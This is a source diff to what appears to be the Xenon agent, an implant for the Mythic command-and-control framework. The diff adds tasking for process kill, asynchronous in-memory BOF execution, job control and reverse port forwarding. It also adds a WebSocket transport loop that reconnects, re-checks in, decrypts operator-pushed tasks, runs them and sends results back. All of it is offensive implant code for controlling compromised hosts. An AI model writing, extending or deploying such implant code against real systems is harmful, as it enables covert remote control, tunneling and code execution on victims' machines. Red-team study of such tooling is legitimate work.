@@ -1,8 +1,12 @@
 #include "Xenon.h"
 #include "Task.h"
+#include "Checkin.h"
 
 #include "Sleep.h"
 #include "Config.h"
+#include "Package.h"
+#include "Parser.h"
+#include "TransportWebsocket.h"
 
 #include "Tasks/Agent.h"
 #include "Tasks/Shell.h"
@@ -11,8 +15,10 @@
 #include "Tasks/Download.h"
 #include "Tasks/Upload.h"
 #include "Tasks/InlineExecute.h"
+#include "Tasks/AsyncBof.h"
 #include "Tasks/InjectShellcode.h"
 #include "Tasks/Socks.h"
+#include "Tasks/Tunnel.h"
 #include "Tasks/Token.h"
 #include "Tasks/Link.h"
 #include "Tasks/Exit.h"
@@ -156,6 +162,14 @@ VOID TaskDispatch(_In_ BYTE cmd, _In_ char* taskUuid, _In_ PPARSER taskParser) {
             return;
         }
 #endif
+#ifdef INCLUDE_CMD_KILL
+        case KILL_CMD:
+        {
+            _dbg("KILL_CMD was called");
+            ProcessKill(taskUuid, taskParser);
+            return;
+        }
+#endif
 #ifdef INCLUDE_CMD_GETUID
         case GETUID_CMD:
         {
@@ -205,6 +219,30 @@ VOID TaskDispatch(_In_ BYTE cmd, _In_ char* taskUuid, _In_ PPARSER taskParser) {
             return;
         }
 #endif
+#ifdef INCLUDE_CMD_ASYNC_EXECUTE
+        case ASYNC_EXECUTE_CMD:
+        {
+            _dbg("ASYNC_EXECUTE_CMD was called");
+            AsyncExecute(taskUuid, taskParser);
+            return;
+        }
+#endif
+#ifdef INCLUDE_CMD_JOBKILL
+        case JOBKILL_CMD:
+        {
+            _dbg("JOBKILL_CMD was called");
+            AsyncBofJobKill(taskUuid, taskParser);
+            return;
+        }
+#endif
+#ifdef INCLUDE_CMD_JOBS
+        case JOBS_CMD:
+        {
+            _dbg("JOBS_CMD was called");
+            AsyncBofJobs(taskUuid, taskParser);
+            return;
+        }
+#endif
 #ifdef INCLUDE_CMD_SPAWNTO
         case SPAWNTO_CMD:
         {
@@ -232,6 +270,20 @@ VOID TaskDispatch(_In_ BYTE cmd, _In_ char* taskUuid, _In_ PPARSER taskParser) {
         {
             _dbg("SOCKS_RESP was called");
             SocksProcessData(taskParser);
+            return;
+        }
+#endif
+#ifdef INCLUDE_CMD_RPORTFWD
+        case RPORTFWD_CMD:
+        {
+            _dbg("RPORTFWD_CMD was called");
+            Rportfwd(taskUuid, taskParser);
+            return;
+        }
+        case RPORTFWD_RESP:
+        {
+            _dbg("RPORTFWD_RESP was called");
+            RportfwdProcessData(taskParser);
             return;
         }
 #endif
@@ -348,8 +400,14 @@ VOID TaskProcess(PPARSER tasks)
  */
 VOID TaskRoutine()
 {
-    /* Send Msgs in the Queue */
+    /* Drain async BOF messages before sending all */
+#if defined(INCLUDE_CMD_ASYNC_EXECUTE) || defined(INCLUDE_CMD_JOBKILL) || defined(INCLUDE_CMD_JOBS)
+    AsyncBofPush();
+#endif
+    
 
+    /* Now lets send all messages in the queue depending on the
+     transport type and process responses */
     PARSER Output = { 0 };
 
 #ifdef HTTPX_TRANSPORT
@@ -408,8 +466,63 @@ VOID TaskRoutine()
 
 #endif
 
-    /* Handle all those resposnes */
+#ifdef WEBSOCKET_TRANSPORT
 
+    /* Reconnect + re-checkin if the Push socket dropped */
+    if ( !WebsocketIsConnected() )
+    {
+        _dbg("[WS] Disconnected - reconnecting and re-checking in");
+        SleepWithJitter(xenonConfig->sleeptime, xenonConfig->jitter);
+        if ( !WebsocketConnect() || !CheckinSend() )
+        {
+            _err("[WS] Reconnect/checkin failed - will retry");
+            WebsocketClose();
+            return;
+        }
+    }
+
+
+    PackageSendAll(NULL);
+
+
+    /* Drain all pushed inbound Mythic messages */
+    {
+        PBYTE  pInData = NULL;
+        SIZE_T InLen   = 0;
+
+        while ( WebsocketReceive(&pInData, &InLen) )
+        {
+            if ( pInData != NULL && InLen != 0 )
+            {
+                PARSER Inbound = { 0 };
+
+                ParserNew(&Inbound, pInData, InLen);
+
+                LocalFree(pInData);
+                pInData = NULL;
+
+                ParserDecrypt(&Inbound);
+
+                if ( Inbound.Buffer != NULL && Inbound.Length != 0 )
+                {
+                    _dbg("[WS] Pushed message from Mythic: %d bytes", Inbound.Length);
+                    TaskProcess(&Inbound);
+                }
+
+                ParserDestroy(&Inbound);
+            }
+
+            pInData = NULL;
+            InLen   = 0;
+        }
+    }
+
+#endif
+
+    /* Handle all those responses */
+#ifdef WEBSOCKET_TRANSPORT
+    /* TaskProcess already ran for each inbound frame above */
+#else
     if ( Output.Buffer != NULL && Output.Length != 0 )
     {
         
@@ -417,6 +530,7 @@ VOID TaskRoutine()
     }
 
     if (&Output != NULL) ParserDestroy(&Output);
+#endif
     
 
     /* Check all Links and push delegates to Server */
@@ -440,11 +554,46 @@ VOID TaskRoutine()
 
 #endif
 
+    /* Push reverse port forward data to Server */
+#if defined(INCLUDE_CMD_RPORTFWD)
+
+    RportfwdPush();
+
+#endif
+
+
+#ifdef WEBSOCKET_TRANSPORT
+
+    /* Flush anything TaskProcess / SocksPush / etc. just queued.
+     Without this, responses sit until the next inbound wake-up. */
+    PackageSendAll(NULL);
+
+#else
+
+#endif  // #ifdef WEBSOCKET_TRANSPORT
+
 
 CLEANUP:
 
+#ifdef WEBSOCKET_TRANSPORT
+
+    /* True Push idle: block until Mythic pushes a frame.
+     When local tunnels/downloads need servicing, use a short wait so
+     SocksPush/RportfwdPush/DownloadPush keep ticking without C2 polls.
+     If disconnected, never INFINITE-wait (nothing will signal). */
+    if ( !WebsocketIsConnected() )
+        return;
+    else if ( WebsocketNeedsLocalPump() )
+        WebsocketWaitInbound(0);
+    else
+        WebsocketWaitInbound(INFINITE);
+
+#else
+
     // zzzz
     SleepWithJitter(xenonConfig->sleeptime, xenonConfig->jitter);
+
+#endif
 
     return;
 }
